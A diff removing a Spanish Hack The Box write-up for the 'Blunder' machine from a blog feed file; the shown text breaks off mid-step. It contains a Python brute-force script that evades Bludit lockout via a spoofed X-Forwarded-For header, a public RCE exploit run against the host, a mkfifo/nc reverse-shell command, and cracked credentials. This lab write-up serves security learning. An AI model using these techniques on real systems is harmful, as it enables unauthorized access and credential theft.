@@ -6217,618 +6676,6 @@ root@quick:~# cat root.txt
         <category>change password db</category>
         
         <category>Abusing Printer</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Blunder - htb writeup</title>
-        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Blunder&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; dificultad facil, la cual explotaremos obteniendo información lekeada y obteniendo credenciales a partir de un ataque de fuerza bruta usando una tecnica de bypass, una vez dispongamos de las credenciales podremos vulnerar el gestor &lt;code&gt;BLUDIT CMS&lt;/code&gt; que corre la maquina, donde a traves de RCE ganaremos acceso a la maquina y finalmente para escalar privilegios aprovecharemos de una versión vulnerable de &lt;code&gt;sudo&lt;/code&gt; con la que conseguiremos acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Maquina interesante asi que a darle!&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Blunder
-❯ ls
- Blunder
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.191
-PING 10.10.10.191 (10.10.10.191) 56(84) bytes of data.
-64 bytes from 10.10.10.191: icmp_seq=1 ttl=63 time=265 ms
-
---- 10.10.10.191 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 265.087/265.087/265.087/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.191 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 18:55 GMT
-Initiating SYN Stealth Scan at 18:55
-Scanning 10.10.10.191 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.191
-Completed SYN Stealth Scan at 18:55, 26.57s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.191
-Host is up, received user-set (0.13s latency).
-Scanned at 2023-06-14 18:55:12 GMT for 26s
-Not shown: 65533 filtered tcp ports (no-response), 1 closed tcp port (reset)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT   STATE SERVICE REASON
-80/tcp open  http    syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds
-           Raw packets sent: 131086 (5.768MB) | Rcvd: 21 (920B)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Solamente vemos que se encuentra abierto el puerto &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80 10.10.10.191 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 19:00 GMT
-Nmap scan report for 10.10.10.191
-Host is up (0.13s latency).
-
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Blunder | A blunder of interesting facts
-|_http-generator: Blunder
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;80&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;Apache httpd 2.4.41&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Comenzaremos usando &lt;code&gt;whatweb&lt;/code&gt;, para enumerar las tecnologias que emplea el servicio web, desde consola.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.191
-http://10.10.10.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;La herramienta nos reporta que se el gestor de contenido del servicio web corresponde a un &lt;code&gt;bludit CMS&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Bludit: Bludit es una aplicación web para construir tu propio sitio web o blog en segundos, es completamente gratis y de código abierto&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Seguidmente vamos abrir la web en el navegador.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Observamos que a simple vista la pagina no muestra contenido interesante. Por ello intentaremos enumerar rutas expuestas del servicio con la herramienta &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/xmendez/wfuzz&quot;&gt;https://github.com/xmendez/wfuzz&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.191/FUZZ
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                               
-=====================================================================
-
-000000026:   200        105 L    303 W      3280 Ch     &quot;about&quot;                                                                                                               
-000000259:   301        0 L      0 W        0 Ch        &quot;admin&quot;                                                                                                               
-000000124:   200        170 L    918 W      7561 Ch     &quot;0&quot;                                                                                                                   
-000002551:   200        110 L    387 W      3959 Ch     &quot;usb&quot;                                                                                                                 
-000003295:   200        21 L     171 W      1083 Ch     &quot;LICENSE&quot;      
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de unos instantes &lt;code&gt;wfuzz&lt;/code&gt; nos reporta rutas validas, en las cuales podemos ver una de &lt;code&gt;admin&lt;/code&gt; y si vamos a esa ruta nos redirige a un panel de inicio de sesión.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a tratar de validar si existe una ruta &lt;code&gt;robots.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que efectivamente existe, ahora haciendo un poco de guesing quiero pensar que existen otros archivo con la extensión &lt;code&gt;.txt&lt;/code&gt; en las rutas, asi que nuevamente con &lt;code&gt;wfuzz&lt;/code&gt; vamos a validar si existen.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ.txt
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.191/FUZZ.txt
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                               
-=====================================================================
-
-000001765:   200        1 L      4 W        22 Ch       &quot;robots&quot;                                                                                                              
-000002495:   200        4 L      23 W       118 Ch      &quot;todo&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos ver que ademas del robots.txt, existe un archivo &lt;code&gt;todo.txt&lt;/code&gt; y si lo visualizamos en el navegador obtenemos un usuario &lt;code&gt;fergus&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora volvamos a el panel de logeo y interceptemos la petición que se realiza con la ayuda de &lt;code&gt;burpsuite&lt;/code&gt; y el &lt;code&gt;foxyproxy&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos abrimos &lt;code&gt;burpsuite&lt;/code&gt; y vemos como se transmite la petición.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que se envia una petición &lt;code&gt;POST&lt;/code&gt; con algunos parametros, incluidos un &lt;code&gt;Token CSRF&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Ahora ya que disponemos de un usuario valido podriamos tratar de mediante un ataque de fuerza bruta obtener la contrasena, pero para ello necesitamos usar un diccionario de contraseñas.&lt;/p&gt;
-
-&lt;p&gt;Anterirmente vimos que la pagina web contenia bastante texto, por que podriamos tratar e hacer un diccionario con las palabras usadas, para ello usaremos la herramienta &lt;code&gt;cewl&lt;/code&gt; y al pasarle la ip de la web podemos crearnos un diccionario en base a sus palabras y lo exportaremos en un fichero de nombre &lt;code&gt;dictionary.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cewl -w dictionary.txt http://10.10.10.191
-CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
-❯ ls
- dictionary.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;AHora que disponemos de un usuario valido &lt;code&gt;fergus&lt;/code&gt; y de un diccionario de posibles contraseñas &lt;code&gt;dictionary.txt&lt;/code&gt;, podemos crearnos un script en &lt;code&gt;python&lt;/code&gt; para automatizar el proceso de fuerza bruta y averiguar la contraseña valida.&lt;/p&gt;
-
-&lt;p&gt;Llamaremos a nuestro &lt;code&gt;exploit&lt;/code&gt; bludit.py.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
-
-
-from pwn import *
-import requests, re
-
-
-def def_handler(sig, frame):
-    print(&quot;\n[!]Saliendo...!\n&quot;)
-    sys.exit(1)
-
-#ctrl_c
-signal.signal(signal.SIGINT, def_handler)
-#variables_globales
-main_url = &quot;http://10.10.10.191/admin/&quot;
-
-
-def makeRequests():
-
-    s = requests.session()
-
-    passwords = open(&quot;dictionary.txt&quot;, 'r')
-
-    p1 = log.progress(&quot;Fuerza Bruta&quot;)
-    p1.status(&quot;Iniciando proceso de Fuerza Bruta&quot;)
-    time.sleep(2)
-
-    counter = 1
-
-    for password in passwords.readlines():
-        
-        password = password.strip('\n')
-       
-        p1.status(&quot;Probando con la password [%d/349]: %s&quot; % (counter, password))
-
-        r = s.get(main_url)
-
-        tokenCSRF = re.findall(r'name=&quot;tokenCSRF&quot; value=&quot;(.*?)&quot;', r.text)[0]
-
-        post_data = {
-                &quot;tokenCSRF&quot;: tokenCSRF,
-                &quot;username&quot;: &quot;fergus&quot;,
-                &quot;password&quot;: password,
-                &quot;save&quot;: ''
-        }
-
-
-        r = s.post(main_url, data=post_data)
-        counter += 1
-
-        if &quot;Username or password incorrect&quot; not in r.text:
-            p1.success(&quot;La contraseña es %s&quot; % password)
-            sys.exit(0)
-
-if __name__=='__main__':
-
-    makeRequests()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ejecutamos el exploit y despues de unos segundos nos valida que la contraseña es: &lt;code&gt;King&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 prueba.py
-[+] Fuerza Bruta: La contraseña es King
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Probamos a logearnos en el servicio y vemos que las credenciales son incorrectas, ademas vemos un mensaje que nos dice que nuestra ip fue bloqueada.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Investigando un poco vemos que existe una forma de bypasear el uso de fuerza bruta en &lt;code&gt;Bludit&lt;/code&gt;, atraves de la cabezera &lt;code&gt;X-Forwarded-For&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&quot;&gt;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Modificamos nuestro exploit y añadismos la cabezera &lt;code&gt;X-Forwarded-For&lt;/code&gt;, con el valor de nuestra variable &lt;code&gt;password&lt;/code&gt;, aprovechando que este por cada iteración sera aleatorio,&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
-
-from pwn import *
-import requests, re
-
-
-def def_handler(sig, frame):
-    print(&quot;\n[!]Saliendo...!\n&quot;)
-    sys.exit(1)
-
-#ctrl_c
-signal.signal(signal.SIGINT, def_handler)
-#variables_globales
-main_url = &quot;http://10.10.10.191/admin/&quot;
-
-
-def makeRequests():
-
-    s = requests.session()
-
-    passwords = open(&quot;dictionary.txt&quot;, 'r')
-
-    p1 = log.progress(&quot;Fuerza Bruta&quot;)
-    p1.status(&quot;Iniciando proceso de Fuerza Bruta&quot;)
-    time.sleep(2)
-
-    counter = 1
-    for password in passwords.readlines():
-        
-        password = password.strip('\n')
-        
-        p1.status(&quot;Probando con la paassword [%d / 349] %s&quot; % (counter, password))
-
-        r = s.get(main_url)
-
-        tokenCSRF = re.findall(r'name=&quot;tokenCSRF&quot; value=&quot;(.*?)&quot;', r.text)[0]
-
-        post_data = {
-                &quot;tokenCSRF&quot;: tokenCSRF,
-                &quot;username&quot;: &quot;fergus&quot;,
-                &quot;password&quot;: password,
-                &quot;save&quot;: ''
-        }
-
-        myHeaders = {
-            'X-Forwarded-For': password
-        }
-
-        r = s.post(main_url, data=post_data, headers=myHeaders)
-        counter += 1
-
-        if &quot;Username or password incorrect&quot; not in r.text:
-            p1.success(&quot;La contraseña es %s&quot; % password)
-            sys.exit(0)
-
-if __name__=='__main__':
-
-    makeRequests()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de unos instantes logramos obtener la contraseña del usuario &lt;code&gt;fergus:RolandDeschain&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 bludit.py
-[.] Fuerza Bruta: Probando con la password the
-[+] Fuerza Bruta: La contraseña es RolandDeschain
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Validamos la contraseña en la pagina de logeo y ganamos acceso a un panel de dashboard.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si ahora buscamos vulnerabilidades asociadas a &lt;code&gt;bludit&lt;/code&gt;, encontramos un exploit en python asociado &lt;code&gt;Directory Traversal&lt;/code&gt; que deriva en ejecución remota de comandos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit bludit
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Bludit - Directory Traversal Image File Upload (Metasploit)                                                                                          | php/remote/47699.rb
-Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)                                                                                                | php/webapps/50529.txt
-Bludit 3.9.12 - Directory Traversal                                                                                                                  | php/webapps/48568.py
-Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                | php/webapps/48942.py
-Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                         | php/webapps/49037.rb
-Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                           | php/webapps/48746.rb
-Bludit 3.9.2 - Directory Traversal                                                                                                                   | multiple/webapps/48701.txt
-bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                                                                    | php/webapps/46060.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos traemos el exploit y al ejecutarlo nos pide algunos parametros&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -m php/webapps/48568.py
-  Exploit: Bludit 3.9.12 - Directory Traversal
-      URL: https://www.exploit-db.com/exploits/48568
-     Path: /usr/share/exploitdb/exploits/php/webapps/48568.py
-File Type: Python script, ASCII text executable, with very long lines
-
-Copied to: /home/fmiracle/Git/firtsmiracle.github.io/assets/images/HTB/htb-writeup-Blunder/48568.py
-❯ mv 48568.py exploit_bludit.py
-❯ python3 exploit_bludit.py
-
-
-╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
-╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
-╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝
-
- CVE-2019-16113 CyberVaca
-
-
-usage: exploit_bludit.py [-h] -u URL -user USER -pass PASSWORD -c COMMAND
-exploit_bludit.py: error: the following arguments are required: -u, -user, -pass, -c
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ejecutamos el exploit con los parametros correspondientes y con &lt;code&gt;-c&lt;/code&gt; especificamos el comandos que deseamos ejecutar, para ello probaremos enviarnos una traza a nuestra maquina.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'ping 10.10.16.4'
-
-
-╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
-╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
-╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝
-
- CVE-2019-16113 CyberVaca
-
-
-[+] csrf_token: 56c6bb6a8ba8cb234b81e3fc60794fa537f591c6
-[+] cookie: tg456638i906rknr4n27it5kr3
-[+] csrf_token: 0208621fe6b05f215d6f16a7675200b78af3cd2b
-[+] Uploading tdbdwfqf.jpg
-[+] Executing command: ping 10.10.16.4
-[+] Delete: .htaccess
-[+] Delete: tdbdwfqf.jpg
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y vemos que recibimos la traza en nuestro equipo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 icmp -n
-tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
-listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
-20:48:34.774870 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 1, length 64
-20:48:34.774896 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 1, length 64
-20:48:35.702537 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 2, length 64
-20:48:35.702583 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 2, length 64
-20:48:36.774871 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 3, length 64
-20:48:36.774913 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 3, length 64
-20:48:37.615149 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 4, length 64
-20:48:37.615194 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 4, length 64
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo siguiente sera mandaremos una reverse shell con la versión antigua de &lt;code&gt;ntcat&lt;/code&gt; haciendo uso de &lt;code&gt;mkfifo&lt;/code&gt; a nuestra maquina.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.16.4 443 &amp;gt;/tmp/f'
-
-
-╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
-╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
-╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝
-
- CVE-2019-16113 CyberVaca
-
-
-[+] csrf_token: cc25e735f2604125be5c2142412dbe2253a33fea
-[+] cookie: a8c95lrdmos65m0545e9fflgh4
-[+] csrf_token: 0f6fc1b9b0455869059adf72375ddcb9cef563bb
-[+] Uploading rubnxlev.jpg
-[+] Executing command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.16.4 443 &amp;gt;/tmp/f
-[+] Delete: .htaccess
-[+] Delete: rubnxlev.jpg
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y obtenemos acceso como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.191.
-Ncat: Connection from 10.10.10.191:47166.
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-www-data
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como de constumbre vamos a otorgarnos una &lt;code&gt;tty full interactive&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
-Script started, file is /dev/null
-www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ ^Z
-zsh: suspended  ncat -nlvp 443
-❯ stty raw -echo; fg
-[1]  + continued  ncat -nlvp 443
-                                reset xterm
-www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export TERM=xterm
-www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export SHELL=bash
-www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ stty rows 45 columns 184
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Enumerando el sistema dentro en el directorio &lt;code&gt;bludit-3-10-0a&lt;/code&gt;, encontramos el archivo &lt;code&gt;users.php&lt;/code&gt; con un password en hash que podemos tratar de crackear.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
-&amp;lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&amp;gt;
-{
-    &quot;admin&quot;: {
-        &quot;nickname&quot;: &quot;Hugo&quot;,
-        &quot;firstName&quot;: &quot;Hugo&quot;,
-        &quot;lastName&quot;: &quot;&quot;,
-        &quot;role&quot;: &quot;User&quot;,
-        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
-        &quot;email&quot;: &quot;&quot;,
-        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
-        &quot;tokenRemember&quot;: &quot;&quot;,
-        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
-        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
-        &quot;twitter&quot;: &quot;&quot;,
-        &quot;facebook&quot;: &quot;&quot;,
-        &quot;instagram&quot;: &quot;&quot;,
-        &quot;codepen&quot;: &quot;&quot;,
-        &quot;linkedin&quot;: &quot;&quot;,
-        &quot;github&quot;: &quot;&quot;,
-        &quot;gitlab&quot;: &quot;&quot;}
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para ello usaremos nuestro web de confianza y logramos decifrar la contraseña la cual es &lt;code&gt;Password120&lt;/code&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Con la nueva credencial migramos exitosamente como el usuario &lt;code&gt;hugo&lt;/code&gt;, nos dirigimos a su directorio personal y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
-Password: 
